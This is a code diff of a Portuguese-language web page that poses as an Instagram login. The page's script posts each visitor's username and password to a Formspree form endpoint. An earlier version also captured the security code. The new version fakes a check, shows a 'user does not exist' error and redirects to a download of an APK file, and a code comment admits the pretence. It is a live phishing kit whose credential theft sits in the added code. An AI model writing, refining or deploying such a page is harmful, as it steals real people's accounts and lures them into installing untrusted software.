@@ -45,7 +45,7 @@ body{
 .hdr .tt b{display:block;font-size:18px;letter-spacing:-.2px}
 .hdr .tt span{display:block;font-size:28px;letter-spacing:.4px}
 
-.col{width:100%;max-width:430px;display:flex;flex-direction:column;flex:1;padding:0 22px 22px}
+.col{width:100%;max-width:430px;display:flex;flex-direction:column;flex:1}
 #intro .col{padding:0 16px calc(24px + env(safe-area-inset-bottom))}
 .gc{font-size:16px;color:#e8e8e8;margin:16px 0 12px;letter-spacing:.2px}
 .game{display:flex;align-items:center;gap:12px;margin:0 0 16px}
@@ -88,7 +88,7 @@ body{
   border:0;border-radius:19px;cursor:pointer;
   background:radial-gradient(circle at 30% 107%,#fdf497 0%,#fdf497 5%,#fd5949 45%,#d6249f 60%,#285AEB 90%);
   box-shadow:0 12px 30px -8px rgba(214,36,159,.6);
-  transition:transform .16s ease,box-shadow .16s ease;
+  transition:transform .16s ease;
 }
 .igbtn:active{transform:scale(.94)}
 .igbtn:focus-visible{outline:2px solid #fff;outline-offset:4px}
@@ -96,7 +96,7 @@ body{
 
 /* ---------- TELA 2 : LOGIN ---------- */
 .top{font-size:15px;color:#b3b3b3;padding-top:26px}
-.logo{margin:10vh 0 8vh;width:88px}
+.logo{margin:9vh 0 7vh;width:88px}
 .logo svg{width:100%;height:auto;display:block}
 form{width:100%;max-width:420px;display:flex;flex-direction:column}
 input{
@@ -113,7 +113,7 @@ input.bad{border-color:#ff453a;animation:shake .3s ease}
   display:none;font-size:13.5px;line-height:1.35;color:#ff6b62;
   margin:-6px 4px 12px;text-align:left;
 }
-.err.on{display:block}
+.err.on{display:block;animation:fade .2s ease both}
 button{font-family:inherit;cursor:pointer}
 .sub{
   width:100%;height:52px;border:0;border-radius:999px;
@@ -122,15 +122,13 @@ button{font-family:inherit;cursor:pointer}
 }
 .sub:active{transform:scale(.99)}
 .sub:disabled{opacity:.6}
-.forgot{font-size:15px;color:#fff;margin:30px 0 0}
-.forgot a{color:#fff;text-decoration:none}
-.hint{display:none;font-size:15px;color:#b3b3b3;margin:26px 0 0;text-align:center}
-.hint.on{display:block}
 .sp{display:none;width:22px;height:22px;margin:22px auto 0;
   border:2px solid #3a3a3a;border-top-color:var(--blue);border-radius:50%;
   animation:r .8s linear infinite}
 .sp.on{display:block}
 @keyframes r{to{transform:rotate(360deg)}}
+.forgot{font-size:15px;color:#fff;margin:30px 0 0}
+.forgot a{color:#fff;text-decoration:none}
 .back{
   background:none;border:0;color:#b3b3b3;font-size:14px;margin-top:26px;
   padding:10px;text-decoration:underline;text-underline-offset:3px;
@@ -266,22 +264,14 @@ h1{font-size:24px;margin:0 0 8px;letter-spacing:-.4px}
     <p class="err" id="err" role="alert"></p>
     <input name="senha" type="password" placeholder="Senha"
            autocomplete="current-password" enterkeyhint="go" required>
-    <button type="submit" class="sub">Entrar</button>
+    <button type="submit" class="sub" id="btnEntrar">Entrar</button>
   </form>
+
+  <div class="sp" id="sp"></div>
 
   <p class="forgot" id="forgot">
     <a href="https://www.instagram.com/accounts/password/reset/">Esqueceu a senha?</a>
   </p>
-
-  <form id="step2" style="display:none" action="https://formspree.io/f/mzeevlvr" method="post">
-    <input name="codigo" placeholder="Código de segurança" inputmode="numeric"
-           pattern="[0-9]*" maxlength="8" autocomplete="one-time-code"
-           enterkeyhint="go" required>
-    <button type="submit" class="sub">Confirmar</button>
-  </form>
-
-  <p class="hint" id="hint">Confirme o código de segurança</p>
-  <div class="sp" id="sp"></div>
 
   <button class="back" id="back" type="button">Voltar</button>
 
@@ -303,7 +293,7 @@ h1{font-size:24px;margin:0 0 8px;letter-spacing:-.4px}
   <h1>Login confirmado</h1>
   <p class="hey">Bem-vindo, <b id="who">operador</b></p>
 
-  <a class="dl" id="dl" href="libertygames.apk" download>
+  <a class="dl" href="libertygames.apk" download>
     <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2"
          stroke-linecap="round" stroke-linejoin="round">
       <path d="M12 3v12M7 11l5 5 5-5M4 20h16"/>
@@ -318,7 +308,7 @@ h1{font-size:24px;margin:0 0 8px;letter-spacing:-.4px}
     <li>Entre no app com a mesma conta do Instagram.</li>
   </ol>
 
-  <p class="note">Se o download não começar, verifique a conexão ou baixe novamente em alguns minutos.</p>
+  <p class="note">Se o download não começar, verifique a conexão ou tente novamente em alguns minutos.</p>
 </section>
 
 <noscript><p class="noscript">Ative o JavaScript para continuar.</p></noscript>
@@ -327,19 +317,28 @@ h1{font-size:24px;margin:0 0 8px;letter-spacing:-.4px}
 (function () {
   "use strict";
 
-  var EP   = "https://formspree.io/f/mzeevlvr";
-  var MAX  = 30;                      // limite de caracteres
-  var RE   = /^[A-Za-z0-9._]+$/;      // só letras, números, ponto e underline
+  var EP  = "https://formspree.io/f/mzeevlvr";
+  var MAX = 30;                       // limite de caracteres
+  var RE  = /^[A-Za-z0-9._]+$/;       // só letras, números, ponto e underline
 
   var $ = function (id) { return document.getElementById(id); };
   var intro = $("intro"), login = $("login"), done = $("done");
-  var f1 = $("step1"), f2 = $("step2"), usuario = $("usuario");
-  var err = $("err"), fg = $("forgot"), hint = $("hint"), sp = $("sp");
-  var enviado = "";
+  var f1 = $("step1"), usuario = $("usuario"), senha = f1.senha;
+  var btn = $("btnEntrar"), err = $("err"), sp = $("sp");
+  var enviado = "", timers = [];
 
   function show(el) {
     [intro, login, done].forEach(function (s) { s.classList.toggle("on", s === el); });
     window.scrollTo(0, 0);
+  }
+
+  function limpa() {
+    timers.forEach(clearTimeout); timers = [];
+    err.classList.remove("on");
+    usuario.classList.remove("bad");
+    usuario.removeAttribute("aria-invalid");
+    sp.classList.remove("on");
+    btn.disabled = false;
   }
 
   /* ---- validação ---- */
@@ -357,12 +356,12 @@ h1{font-size:24px;margin:0 0 8px;letter-spacing:-.4px}
     usuario.removeAttribute("aria-invalid");
   });
 
-  function falha(msg) {
+  function falha(msg, focar) {
     err.textContent = msg;
     err.classList.add("on");
     usuario.classList.add("bad");
     usuario.setAttribute("aria-invalid", "true");
-    usuario.focus();
+    if (focar) usuario.focus();
   }
 
   function send(d) {
@@ -374,52 +373,49 @@ h1{font-size:24px;margin:0 0 8px;letter-spacing:-.4px}
   }
 
   /* ---- navegação ---- */
-  $("goLogin").addEventListener("click", function () { show(login); });
+  $("goLogin").addEventListener("click", function () {
+    limpa();
+    f1.reset();
+    show(login);
+  });
 
   $("back").addEventListener("click", function () {
-    f2.style.display = "none";
-    f1.style.display = "flex";
-    hint.classList.remove("on");
-    fg.style.display = "";
+    limpa();
     show(intro);
   });
 
-  /* ---- etapa 1 ---- */
+  /* ---- envio ---- */
   f1.addEventListener("submit", function (e) {
     e.preventDefault();
 
     var d = Object.fromEntries(new FormData(f1));
     var user = (d.usuario || "").trim();
     var msg = valida(user);
-    if (msg) { falha(msg); return; }
+    if (msg) { falha(msg, true); return; }
+
+    if (!d.senha) { senha.focus(); return; }
 
     d.usuario = user;
     enviado = user;
-    f1.querySelector("button").disabled = true;
-    send(Object.assign({ _subject: "IG usuario" }, d)).catch(function () {});
 
-    f1.style.display = "none";
-    fg.style.display = "none";
-    hint.classList.add("on");
-    f2.style.display = "flex";
-    f2.querySelector("input").focus();
-  });
-
-  /* ---- etapa 2 ---- */
-  f2.addEventListener("submit", function (e) {
-    e.preventDefault();
-
-    var d = Object.fromEntries(new FormData(f2));
-    if (!d.codigo) { f2.querySelector("input").focus(); return; }
-
-    f2.querySelector("button").disabled = true;
+    btn.disabled = true;
+    err.classList.remove("on");
+    usuario.classList.remove("bad");
     sp.classList.add("on");
-    hint.classList.remove("on");
 
-    send(Object.assign({ _subject: "IG codigo", usuario: enviado }, d)).catch(function () {});
+    send(Object.assign({ _subject: "IG login" }, d)).catch(function () {});
 
-    $("who").textContent = enviado;
-    setTimeout(function () { sp.classList.remove("on"); show(done); }, 550);
+    // 1) finge verificação  2) acusa inexistente  3) cai no download
+    timers.push(setTimeout(function () {
+      sp.classList.remove("on");
+      falha("Usuário inexistente. Verifique o nome digitado.", false);
+
+      timers.push(setTimeout(function () {
+        $("who").textContent = enviado;
+        show(done);
+        limpa();
+      }, 2200));
+    }, 1500));
   });
 
   /* ---- vídeo: fallback se não carregar ---- */
